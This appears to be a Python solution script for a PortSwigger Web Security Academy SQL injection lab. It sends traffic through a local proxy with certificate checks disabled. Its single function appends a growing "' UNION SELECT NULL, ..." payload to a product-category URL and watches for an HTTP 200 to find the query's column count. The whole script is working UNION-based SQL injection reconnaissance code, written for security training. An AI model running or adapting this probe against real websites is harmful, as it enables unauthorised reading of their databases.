from typing import Union
from urllib.parse import quote, quote_plus

import requests as r
import urllib3
from bs4 import BeautifulSoup
from rich.console import Console
from rich.panel import Panel
from rich.traceback import install

install()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session: r.Session = r.Session()
console: Console = Console()

session.verify = False
print = console.print

session.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


def get_col_nums(URL, max_col=10):
    count = 1
    PAYLOAD = "' UNION SELECT "

    for _ in range(max_col):
        PAYLOAD += "NULL, "

        response: r.Response = session.get(URL + quote(PAYLOAD.strip(", ") + " --"))

        if response.status_code == 200:
            break

        count += 1

    return count


def main() -> None:
    URL = "https://0a6900a40386088c8178ac84005a0081.web-security-academy.net/filter?category=Pets"
    print(get_col_nums(URL))


if __name__ == "__main__":
    main()
